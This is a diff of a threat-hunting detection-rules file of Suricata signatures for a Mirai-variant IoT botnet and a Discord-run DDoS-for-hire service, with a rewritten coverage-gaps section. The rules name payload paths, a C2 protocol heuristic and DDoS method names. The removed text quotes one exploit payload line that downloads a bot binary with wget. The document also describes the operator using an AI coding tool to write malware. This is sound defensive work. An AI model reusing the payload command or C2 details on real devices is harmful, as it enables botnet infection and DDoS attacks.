+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Pandora-Mirai Naku Binary Distribution URI Path (IoT Botnet Payload Delivery)"; flow:established,to_server; http.uri; content:"/bins/Naku."; startswith; classtype:trojan-activity; sid:9001003; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
----
+#### Pandora-Mirai Pandoras-Box Binary Distribution URI Path
 
-**Detection Priority:** HIGH
-**Rationale:** TCP/23 (Telnet) outbound to `165.227.175.161` is the Naku/Pandora bot's hardcoded CNC endpoint — a compromised French tourism VPS. Any device on your network initiating a TCP connection to this specific IP on port 23 is an active bot communicating with its CNC. Not subject to port-matching FP (legitimate Telnet traffic to this specific IP does not exist).
-**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol)
-**Confidence:** HIGH — CNC endpoint confirmed via ARM ELF disassembly (raw 32-bit constant extraction)
-**False Positive Risk:** LOW — TCP/23 to this specific destination is exclusively Naku bot CNC traffic
+**Tier:** Detection
+**Robustness:** 2
+**ATT&CK Coverage:** T1071.001 (Web Protocols), T1587.001 (Develop Capabilities: Malware)
+**Confidence:** HIGH
+**Rationale:** Same salvage as the Naku URI-path rule above — broadened from a hardcoded IONOS destination to `$EXTERNAL_NET`, retaining the bespoke `/Pandoras_Box/Pandora.` URI-path content anchor.
+**False Positives:** None known — `/Pandoras_Box/Pandora.` as a URI path prefix has no plausible legitimate collision.
+**Blind Spots:** A rebrand that changes the distribution path convention evades; HTTPS-channel fetches are opaque to this rule without TLS interception.
+**Validation:** Replay a PCAP of a Pandora binary fetch over this URI convention — must alert; ordinary HTTP traffic to unrelated paths must NOT.
+**Deployment:** Network IDS/IPS at perimeter and internal segmentation points.
 
 ```suricata
-# Rule 3 — TCP/23 outbound to Naku parasitic CNC on compromised tourism VPS
-alert tcp $HOME_NET any -> 165.227.175.161 23 (msg:"THL - Naku-Pandora Mirai Bot CNC Connection to Parasitic Host on GetYourGroup Tourism VPS - UTA-2026-014"; flow:to_server,established; sid:9001007; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Pandora-Mirai Pandoras-Box Binary Distribution URI Path (IoT Botnet Payload Delivery)"; flow:established,to_server; http.uri; content:"/Pandoras_Box/Pandora."; startswith; classtype:trojan-activity; sid:9001005; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
----
+### Hunting Rules
 
-**Detection Priority:** HIGH
-**Rationale:** HTTP GET/POST to Aruba Italy distribution servers (`80.211.94.16`, `80.211.111.10`) for Naku binary fetches is the exploit payload delivery pattern — hardcoded in the Realtek CVE-2014-8361 exploit payload: `wget http://80.211.94.16/Naku.mips -O nig`. These servers were operational January 2026; they have since gone dark (May 2026), but the pattern is useful if the operator rotates to a new Aruba account.
+**Pandora-Mirai (Naku ELF Bot Suite)**
+
+#### Pandora-Mirai bot.sh Reseed Download URI Pattern
+
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1071.001 (Web Protocols), T1587.001 (Develop Capabilities: Malware)
+**Confidence:** MODERATE
+**Rationale:** Salvaged (destination broadened from the hardcoded IONOS IP to `$EXTERNAL_NET`), but `bot.sh` is a widely-reused generic dropper/reseed script filename across the broader Mirai-fork ecosystem, not bespoke to this operator — the content anchor alone carries meaningfully less discriminating power than the Naku/Pandoras_Box path rules above.
+**False Positives:** Any unrelated Mirai-fork or generic IoT dropper reusing the common `bot.sh` filename convention (uncommon collision with unrelated legitimate software, but not campaign-specific).
+**Deployment:** Network IDS/IPS at perimeter and internal segmentation points; hunt-tune before alerting.
+
+```suricata
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Pandora-Mirai bot.sh Reseed Download URI Pattern (IoT Botnet Reseed Channel)"; flow:established,to_server; http.uri; content:"/bot.sh"; endswith; classtype:trojan-activity; sid:9001004; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
+```
+
+#### Naku Binary Reference in HTTP URI (Bare Substring)
+
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1071.001 (Web Protocols), T1587.001 (Develop Capabilities: Malware)
+**Confidence:** LOW–MODERATE
+**Rationale:** Salvaged (destination broadened from the hardcoded backup IONOS IP to `$EXTERNAL_NET`), but the content anchor is a bare, unqualified `"Naku."` substring with no `startswith`/`endswith` path qualifier — the weakest anchor among this campaign's Naku-related Suricata rules. Retained as a distinct Hunting entry (rather than merged with the Aruba-distribution variants below) to preserve rule-count accounting for this revision; a future revision should consider consolidating all three bare-`"Naku."` rules into one.
+**False Positives:** Any unrelated URI path or query string containing the 4-character substring "Naku." (uncommon but not impossible).
+**Deployment:** Network IDS/IPS at perimeter and internal segmentation points; hunt-tune before alerting.
+
+```suricata
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Naku Binary Reference in HTTP URI - Backup Channel Convention (Bare Substring Anchor)"; flow:established,to_server; http.uri; content:"Naku."; nocase; classtype:trojan-activity; sid:9001006; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
+```
+
+**Rovodev Operator Artifacts**
+
+#### keyosbuff C2-Leak Repository Reference in HTTP URI
+
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1588.001 (Obtain Capabilities: Malware), T1584.004 (Compromise Infrastructure: Server)
+**Confidence:** MODERATE
+**Rationale:** Single-literal GitHub-handle anchor (`keyosbuff`) with an acknowledged practical detection gap — GitHub is TLS-terminated, so the URL path is normally invisible to a network sensor without TLS interception; this rule only fires on unusual non-TLS references to the handle. Narrow pivot value, not alerting-grade.
+**False Positives:** Any unrelated HTTP traffic referencing the `keyosbuff` GitHub handle for a different (non-C2-Leak) reason.
+**Deployment:** Network IDS/IPS at perimeter; primarily useful with TLS interception or proxy logging capability.
+
+```suricata
+alert http $HOME_NET any -> any any (msg:"THL UTA-2026-014 keyosbuff C2-Leak Repository Reference in HTTP URI (Operator OPSEC Artifact)"; flow:established,to_server; http.uri; content:"keyosbuff"; nocase; classtype:trojan-activity; sid:9001002; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
+```
+
+**Campaign-Level**
+
+#### Naku Binary Fetch URI Pattern — Historical Aruba Distribution Convention
+
+**Tier:** Hunting
+**Robustness:** 1
 **ATT&CK Coverage:** T1071.001 (Web Protocols), T1190 (Exploit Public-Facing Application)
-**Confidence:** HIGH — URLs byte-confirmed in Naku.arm .rodata section plaintext exploit payloads
-**False Positive Risk:** LOW — fetching executable binaries from these specific IPs has no legitimate use case
+**Confidence:** LOW–MODERATE
+**Rationale:** Salvaged (destination broadened from the hardcoded Aruba Italy primary distribution IP to `$EXTERNAL_NET`), but shares the same bare unqualified `"Naku."` substring weakness as the backup-channel rule above; both Aruba distribution servers were confirmed offline/dark as of the underlying investigation, further limiting current operational value beyond the pattern's reuse potential if the operator revives a similar distribution convention.
+**False Positives:** Any unrelated URI path or query string containing the 4-character substring "Naku." (uncommon but not impossible).
+**Deployment:** Network IDS/IPS at perimeter; hunt-tune before alerting.
 
 ```suricata
-# Rule 4 — HTTP egress to Aruba Italy distribution servers
-alert http $HOME_NET any -> 80.211.94.16 any (msg:"THL - Naku-Pandora Mirai Binary Fetch from Aruba Italy Distribution Server (80.211.94.16) - UTA-2026-014"; http.uri; content:"Naku."; sid:9001008; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
-
-alert http $HOME_NET any -> 80.211.111.10 any (msg:"THL - Naku-Pandora Mirai Binary Fetch from Aruba Italy Backup Distribution Server (80.211.111.10) - UTA-2026-014"; http.uri; content:"Naku."; sid:9001009; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Naku Binary Fetch URI Pattern - Historical Aruba Primary Distribution Convention (Bare Substring Anchor)"; flow:established,to_server; http.uri; content:"Naku."; nocase; classtype:trojan-activity; sid:9001008; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
----
+#### Naku Binary Fetch URI Pattern — Historical Aruba Backup Distribution Convention
 
-**Detection Priority:** HIGH
-**Rationale:** The operator-bespoke Mirai protocol modification (option keys as length-prefixed STRINGS vs stock single-byte enum values) defeats standard Mirai-protocol IDS rules. This Suricata rule targets the operator-specific CNC command protocol byte pattern on TCP/23 connections to `165.227.175.161` — specifically the key_length byte followed by ASCII string rather than the standard 1-byte enum at that offset. Defenders using stock Mirai IDS rules will miss this variant.
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1071.001 (Web Protocols), T1190 (Exploit Public-Facing Application)
+**Confidence:** LOW–MODERATE
+**Rationale:** Same salvage and weak-anchor profile as the Aruba primary rule above, against the sibling backup distribution IP (now also confirmed dark).
+**False Positives:** Any unrelated URI path or query string containing the 4-character substring "Naku." (uncommon but not impossible).
+**Deployment:** Network IDS/IPS at perimeter; hunt-tune before alerting.
+
+```suricata
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL UTA-2026-014 Naku Binary Fetch URI Pattern - Historical Aruba Backup Distribution Convention (Bare Substring Anchor)"; flow:established,to_server; http.uri; content:"Naku."; nocase; classtype:trojan-activity; sid:9001009; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
+```
+
+#### Naku-Pandora Mirai Operator-Bespoke CNC Protocol (Length-Prefixed String Option Keys)
+
+**Tier:** Hunting
+**Robustness:** 2
 **ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1027 (Obfuscated Files or Information)
-**Confidence:** HIGH — protocol modification confirmed via ARM ELF disassembly of CNC option-parsing code
-**False Positive Risk:** LOW — pattern is specific to TCP/23 CNC traffic to the operator's host; no legitimate application uses this protocol structure to this destination
+**Confidence:** MODERATE — heuristic, unvalidated against live traffic
+**Rationale:** Salvaged (destination broadened from the hardcoded parasitic-CNC IP to `$EXTERNAL_NET`, keeping port 23), which meaningfully improves durability for what is otherwise a genuine protocol-structure signature (Naku's length-prefixed-string CNC option-key modification, which defeats stock Mirai-protocol IDS rules). Held at Hunting because the PCRE heuristic was never validated against live traffic — the original author explicitly flagged "deploy with threshold or alert-only before promoting to block," which is the Hunting-tier definition.
+**False Positives:** Any unrelated TCP/23 traffic that incidentally matches the byte-pattern heuristic (unvalidated against live traffic — tune before alerting).
+**Deployment:** Network IDS/IPS at perimeter and internal segmentation points; alert-only until validated against live traffic.
 
 ```suricata
-# Rule 5 — Mirai operator-bespoke protocol: length-prefixed string option keys
-# Stock Mirai option key field at CNC command offset is a single byte (0x00-0xFF enum).
-# Naku variant uses a length byte followed by a string — this produces a distinctive
-# pattern where the option block starts with a non-zero length byte followed by
-# printable ASCII chars rather than a single control-byte enum value.
-# Detection: TCP/23 flow to CNC IP carrying 4-byte duration + 1-byte method + target table
-# + option block starting with length-prefixed string (heuristic: byte > 0x01 followed by ASCII)
-alert tcp $HOME_NET any -> 165.227.175.161 23 (msg:"THL - Naku-Pandora Mirai Operator-Bespoke CNC Protocol (Length-Prefixed String Option Keys) - Defeats Stock Mirai IDS Rules - UTA-2026-014"; flow:to_server,established; dsize:>8; content:"|00 00|"; depth:2; offset:0; pcre:"/^.{4}.[\x01-\x14][A-Za-z0-9_]/"; sid:9001010; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity High, tag UTA-2026-014;)
+alert tcp $HOME_NET any -> $EXTERNAL_NET 23 (msg:"THL UTA-2026-014 Naku-Pandora Mirai Operator-Bespoke CNC Protocol - Length-Prefixed String Option Keys (Defeats Stock Mirai IDS Rules, Unvalidated Heuristic)"; flow:established,to_server; dsize:>8; content:"|00 00|"; depth:2; offset:0; pcre:"/^.{4}.[\x01-\x14][A-Za-z0-9_]/"; classtype:trojan-activity; sid:9001010; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
----
+**Matrix C2 Framework**
 
-**Detection Priority:** MEDIUM
-**Rationale:** Discord API egress from server hosts carrying DDoS-method dispatch strings in the request body (detectable via plain-text Discord API channels or proxy inspection). The Matrix C2 Discord bot routes customer attack requests through discord.com/api/v9/ with method names like `ovh-nuke`, `syn-storm`, `frag-storm`. Detection requires TLS inspection or proxy log analysis.
+#### Matrix C2 Discord Bot Attack-Method Dispatch — ovh-nuke
+
+**Tier:** Hunting
+**Robustness:** 2
 **ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood)
-**Confidence:** MODERATE — requires TLS inspection or proxy log capability
-**False Positive Risk:** MEDIUM — Discord API traffic is common; requires content inspection to confirm attack-method dispatch
+**Confidence:** MODERATE
+**Rationale:** No hardcoded operator IP (destination is `discord.com`, a stable third-party SaaS domain), and the `ovh-nuke` method-name string is fairly bespoke — but the rule requires plaintext inspection of the HTTPS request body, which needs TLS interception in most deployments; the original author explicitly flagged this as a MODERATE-confidence, interception-dependent detection.
+**False Positives:** Any legitimate Discord bot traffic that happens to reference the string "ovh-nuke" for an unrelated reason (unlikely but not zero without body-content verification).
+**Deployment:** Network IDS/IPS with TLS interception or proxy logging capability; not effective against opaque HTTPS without interception.
 
 ```suricata
-# Rule 6 — Discord API egress from server hosts with attack-method dispatch pattern
-# Requires SSL/TLS inspection or HTTP proxy (not applicable to raw encrypted Discord HTTPS)
-# Most useful with proxy/DPI capability or in environments where the Discord bot uses
-# non-HTTPS webhook endpoints (unusual but possible in dev/test deployments)
-alert http $HOME_NET any -> any any (msg:"THL - Matrix C2 Discord Bot Attack-Method Dispatch - DDoS-as-a-Service Customer Interface - UTA-2026-014"; http.host; content:"discord.com"; http.request_body; content:"ovh-nuke"; nocase; sid:9001011; rev:1; metadata:affected_product Discord, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity High, tag UTA-2026-014;)
-
-alert http $HOME_NET any -> any any (msg:"THL - Matrix C2 Discord Bot Attack-Method Dispatch syn-storm/frag-storm - UTA-2026-014"; http.host; content:"discord.com"; http.request_body; pcre:"/(?:syn-storm|frag-storm|udp-bypass|icmp-hell)/i"; sid:9001012; rev:1; metadata:affected_product Discord, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity High, tag UTA-2026-014;)
+alert http $HOME_NET any -> any any (msg:"THL UTA-2026-014 Matrix C2 Discord Bot Attack-Method Dispatch ovh-nuke (DDoS-as-a-Service Customer Interface, Requires TLS Interception)"; flow:established,to_server; http.host; content:"discord.com"; http.request_body; content:"ovh-nuke"; nocase; classtype:trojan-activity; sid:9001011; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
----
+#### Matrix C2 Discord Bot Attack-Method Dispatch — syn-storm/frag-storm/udp-bypass/icmp-hell
 
-**Detection Priority:** MEDIUM
-**Rationale:** JARM/JA4X fingerprint matching for `87.106.143.220` catches the operator's IONOS infrastructure across port/service migrations. JARM fingerprints are infrastructure-level signatures that persist even when services rotate ports or content. Deployment requires JARM-capable network sensor (Zeek + JARM script, or JA4 sensor).
-**ATT&CK Coverage:** T1583.003 (Acquire Infrastructure: VPS), T1584.004 (Compromise Infrastructure: Server)
-**Confidence:** MODERATE — JARM fingerprint may change with TLS library updates on the host; provides hunting pivot rather than high-confidence block
-**False Positive Risk:** LOW for the specific JARM hash; MEDIUM if IONOS uses shared TLS termination across customers (possible cluster false positives)
+**Tier:** Hunting
+**Robustness:** 2
+**ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood)
+**Confidence:** MODERATE
+**Rationale:** Same profile as the `ovh-nuke` rule above — durable domain anchor, bespoke method-name PCRE, but requires TLS interception to inspect the HTTPS request body in most deployments.
+**False Positives:** Any legitimate Discord bot traffic that happens to reference one of these four strings for an unrelated reason (unlikely but not zero without body-content verification).
+**Deployment:** Network IDS/IPS with TLS interception or proxy logging capability; not effective against opaque HTTPS without interception.
 
 ```suricata
-# Rule 7 — JARM/JA4X fingerprint for operator IONOS host 87.106.143.220
-# JARM fingerprint observed at investigation time; may drift with TLS library updates.
-# Deploy as hunting/pivot rule rather than blocking rule.
-# Note: Suricata does not natively match JARM hashes; this requires integration with
-# Zeek JARM script or JA4+ sensor producing JARM metadata as flow metadata.
-# The SID is reserved; actual JARM matching should be implemented via threat intel feeds.
-# For native Suricata, match on destination IP + TLS port as a network-layer pivot.
-alert tls $HOME_NET any -> 87.106.143.220 any (msg:"THL - TLS Connection to Rovodev Operator IONOS VPS 87.106.143.220 - Pivot on Operator Infrastructure - UTA-2026-014"; flow:to_server; sid:9001013; rev:1; metadata:affected_product Linux_Server, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Medium, tag UTA-2026-014;)
-
-alert tls $HOME_NET any -> 87.106.54.213 any (msg:"THL - TLS Connection to Rovodev Operator IONOS Backup VPS 87.106.54.213 - Pivot on Operator Infrastructure - UTA-2026-014"; flow:to_server; sid:9001014; rev:1; metadata:affected_product Linux_Server, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Medium, tag UTA-2026-014;)
+alert http $HOME_NET any -> any any (msg:"THL UTA-2026-014 Matrix C2 Discord Bot Attack-Method Dispatch syn-storm-frag-storm (DDoS-as-a-Service Customer Interface, Requires TLS Interception)"; flow:established,to_server; http.host; content:"discord.com"; http.request_body; pcre:"/(?:syn-storm|frag-storm|udp-bypass|icmp-hell)/i"; classtype:trojan-activity; sid:9001012; rev:2; metadata:author The_Hunters_Ledger, date 2026-05-26, reference https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/;)
 ```
 
 ---
 
 ## Coverage Gaps
 
-### github.com/keyosbuff/C2-Leak — Deleted Upstream Source Gap
+**Atomics routed to the IOC feed (5 rules removed from this revision).** Two Sigma `network_connection` rules (outbound TCP/1337 to `87.106.143.220`, outbound TCP/23 to `165.227.175.161`) and three Suricata rules (the pure TCP/23 CNC-connection rule against `165.227.175.161`, and the two bare-TLS-connection "pivot" rules against `87.106.143.220`/`87.106.54.213` — the latter's own original commentary already conceded "actual JARM matching should be implemented via threat intel feeds") each reduced, once the hardcoded IP was mentally removed, to no surviving behavioral content. All four underlying IPs were already present with rich context in [`rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json) — no feed edits were required. **What would enable a rule:** a distinctive, destination-agnostic protocol or content signature for either channel (see the salvaged CNC-protocol Suricata rule above for the Naku channel, which does carry such a signature for the parasitic CNC's *command structure* — the pure-IP connection rule for the same IP was still separately routed to the feed since it added no signal beyond the address itself).
 
-**Technique:** T1588.001 (Obtain Capabilities: Malware)
-**Gap:** The operator's declared upstream Mirai code source (`github.com/keyosbuff/C2-Leak`) is now 404/deleted as of Phase 15 §22. Without access to that repository, a direct code-diff comparison between the upstream source and the operator's Naku variant cannot be performed. This prevents characterization of all operator-bespoke modifications beyond what was discovered independently via binary analysis (triple XOR keys, double Huawei scanner, 22-char charset, string-length-prefixed option keys, `.anime` marker). Evidence that would close this gap: GitHub archive scrape capturing the repo before deletion, a cached copy in GitHub Archive, or a second operator referencing the same repository.
-**Current coverage:** PARTIAL — operator-bespoke modifications documented via binary analysis; upstream scope unknown.
+**Suricata rule redundancy — three overlapping bare-`"Naku."` substring rules.** After salvaging the destination-hardcoded Aruba and IONOS-backup rules to `$EXTERNAL_NET`, three Hunting-tier Suricata rules (sid 9001006, 9001008, 9001009) now carry functionally identical detection logic (`http.uri; content:"Naku."; nocase`) distinguished only by `msg`/`sid`. They are preserved as three separate entries in this revision to keep the rule-count accounting auditable against the original file. **What would enable consolidation:** a future revision merging these into one Hunting rule (retiring two `sid`s) once historical per-VPS attribution is no longer needed for the — now largely dark — Aruba Italy distribution servers.
 
----
+**github.com/keyosbuff/C2-Leak — deleted upstream source gap.** The operator's declared upstream Mirai code source is now 404/deleted. Without access to that repository, a direct code-diff comparison between the upstream source and the operator's Naku variant cannot be performed; all operator-bespoke modifications documented here (triple XOR keys, double Huawei scanner, 22-char charset, string-length-prefixed option keys, `.anime` marker) were discovered independently via binary analysis. **What would enable closure:** a GitHub Archive scrape capturing the repo before deletion, or a second operator referencing the same repository.
 
-### Matrix C2 Python Protocol — No Public Reference for Comparison
+**Matrix C2 Python protocol — no public reference for comparison.** The Matrix C2 JSON-over-TCP protocol has no documented reference implementation to compare against; the operator built it from scratch (AI-co-authored). Detection coverage is IP/port-level only (routed to the IOC feed per above); no deep-packet-inspection signature exists for the JSON payload itself. **What would enable a rule:** passive capture of an actual C2 session from a compromised victim host, yielding a payload-structure content anchor independent of the current C2 IP.
 
-**Technique:** T1095 (Non-Application Layer Protocol)
-**Gap:** The Matrix C2 JSON-over-TCP protocol (`87.106.143.220:1337`) has no documented reference implementation to compare against. The operator built this protocol from scratch (AI-co-authored) and no prior public operator has used this exact schema (`bot_register` + `heartbeat` with `bot_type`/`arch`/`vendor` JSON fields). Deeper behavioral analysis (packet captures from live botnet operation) would enable more precise protocol-layer detection signatures. Evidence that would enable higher-confidence Suricata content rules: passive capture of actual C2 sessions from a compromised victim host.
-**Current coverage:** LOW — IP/port-level detection only; no deep packet inspection rules for the JSON payload.
+**Pandora 11-arch IoT evolution — no prior public documentation for the extended family.** Prior public documentation of the Pandora-Mirai family (Doctor Web, September 2023) covers only the Android-TV scope; the 11-architecture IoT extension is first public characterization here. If a second downstream operator adopts the IoT-extended codebase with different naming/charset conventions, the family-specific rules in this file will not transfer. **Current coverage:** HIGH for this specific operator's build; MODERATE for the broader Pandora-Mirai IoT-extended family class.
 
----
+**Parasitic-CNC-on-legitimate-VPS OPSEC pattern — no Mirai-family literature precedent.** The operator's use of a compromised legitimate tourism VPS specifically for the Naku CNC, while reserving operator-owned infrastructure for the higher-value Matrix C2 customer service, is a documented-here split-channel OPSEC pattern with no Mirai-family literature precedent found in Tier 1–3 sources. Behavioral detection of this OPSEC strategy (versus the IP-level indicators, now in the feed) would require network telemetry correlating a CNC process with co-located legitimate web-hosting traffic on the same host — standard IDS setups do not surface this. **Current coverage:** LOW (network-level detection only via the feed; no class-level behavioral detection).
 
-### Pandora 11-Arch IoT Evolution — No Prior Public Documentation
+**Rovodev session JSON detection — requires Atlassian-side telemetry for non-exposed operators.** The on-disk session artifacts detected by the YARA and Sigma rules above are only visible when the operator makes an OPSEC error (exposing the session JSON via open directory). In a non-exposed deployment, the operator's use of Rovodev for offensive code authoring is invisible to standard endpoint/network tooling. **Current coverage:** LOW — endpoint artifact detection only (requires operator OPSEC failure); zero coverage of in-progress Rovodev offensive sessions that are never exposed.
 
-**Technique:** T1190 (Exploit Public-Facing Application), T1588.001 (Obtain Capabilities: Malware)
-**Gap:** Prior public documentation of the Pandora-Mirai family (Doctor Web September 2023) covers only the Android-TV scope. The 11-architecture IoT extension documented in this investigation is first public characterization. No comparative corpus exists for prior-art YARA rules targeting the IoT-extended variant family. This means detection coverage relies entirely on operator-bespoke indicators found in this investigation; if a second downstream operator adopts the IoT-extended codebase with different naming/charset conventions, coverage will degrade.
-**Current coverage:** HIGH for this specific operator's build; MODERATE for the broader Pandora-Mirai IoT-extended family class.
-
----
-
-### Parasitic-CNC-on-Legit-VPS OPSEC Pattern — No Mirai-Family Literature Precedent
-
-**Technique:** T1584.004 (Compromise Infrastructure: Server)
-**Gap:** The operator's use of a compromised legitimate tourism VPS (`165.227.175.161` / GetYourGroup GmbH) specifically for Naku CNC, while reserving operator-owned IONOS infrastructure for the higher-value Matrix C2 customer service, is a documented-here split-channel OPSEC pattern with no Mirai-family literature precedent found in Tier 1–3 sources. Without a known pattern signature, behavioral detection of this OPSEC strategy requires network telemetry showing a CNC on a host with co-located legitimate web traffic — which standard IDS setups do not surface. Evidence that would enable class-level detection: longitudinal study of Mirai CNC infrastructure across multiple threat actors to characterize parasitic-CNC adoption rates.
-**Current coverage:** LOW (network-level detection only via known IPs; no class-level behavioral detection).
-
----
-
-### Rovodev Session JSON Detection — Requires Atlassian-Side Telemetry
-
-**Technique:** T1587.001 (Develop Capabilities: Malware)
-**Gap:** Full detection of the operator's AI co-authoring workflow requires access to Atlassian Rovodev server-side telemetry (session logs, file_write tool call auditing, abuse detection). The on-disk artifacts detected by YARA rules 8 and Sigma rule 9 are only visible when the operator makes an OPSEC error (exposing the session JSON via open directory). In a non-exposed deployment, the operator's use of Rovodev for offensive code authoring is invisible to standard SOC tooling. Closing this gap requires Atlassian Trust & Safety partnership for detection at the platform level, not the endpoint level.
-**Current coverage:** LOW — endpoint artifact detection only (requires operator OPSEC failure); zero coverage of in-progress Rovodev offensive sessions.
-
----
-
-### Discord Operator Account — Vendor Channel Required for Termination
-
-**Technique:** T1583.003 (Acquire Infrastructure: VPS), T1059.007 (JavaScript)
-**Gap:** The Discord operator account snowflake (`1441591352927326259`, created 2025-11-22) is detected via YARA rule 10 (artifact exposure). However, Discord account termination and bot takedown requires direct coordination with Discord Trust & Safety — there is no standard SOC workflow for this. The snowflake-decode methodology (timestamp extraction from Discord ID, freshness signal calculation) is documented and reproducible but the ops-account termination action is out of standard SOC scope. Evidence required for Discord T&S: the captured `whatineed.txt` prompt (direct DDoS-for-hire solicitation), the Discord bot's attack-dispatch JavaScript table (direct evidence of DDoS service customer interface), and the operator ID snowflake for account lookup.
-**Current coverage:** DETECTION HIGH (YARA rule 10); REMEDIATION OUT OF SCOPE (requires vendor channel).
-
----
-
-### Mirai Handshake Detection — Suricata Rule 5 Protocol Heuristic
-
-**Technique:** T1095 (Non-Application Layer Protocol)
-**Gap:** The Suricata Rule 5 (operator-bespoke Mirai protocol pattern) uses a PCRE heuristic on the CNC command stream. Without ground-truth packet captures from active Naku bot sessions, the PCRE cannot be validated against real traffic. The regex pattern (`/^.{4}.[\x01-\x14][A-Za-z0-9_]/`) is derived from the disassembled parsing logic but may require tuning after live traffic validation. Deploy with threshold or alert-only before promoting to block.
-**Current coverage:** MODERATE — heuristic only; requires live traffic validation.
+**Discord operator account — vendor channel required for termination.** The Discord operator account snowflake is detected via the Hunting-tier YARA rule above (artifact exposure only). Account termination and bot takedown require direct coordination with Discord Trust & Safety; there is no standard detection-engineering workflow for this action. **Current coverage:** DETECTION present (Hunting-tier artifact match); remediation is out of scope for a detection rule.
 
 ---
 
 ## License
-
-Detection rules are licensed under **Creative Commons Attribution 4.0 International (CC BY 4.0)**.
+Detection rules are licensed under **Creative Commons Attribution 4.0 International (CC BY 4.0)**.  
 Free to use, including commercially, with attribution to The Hunters Ledger.
-
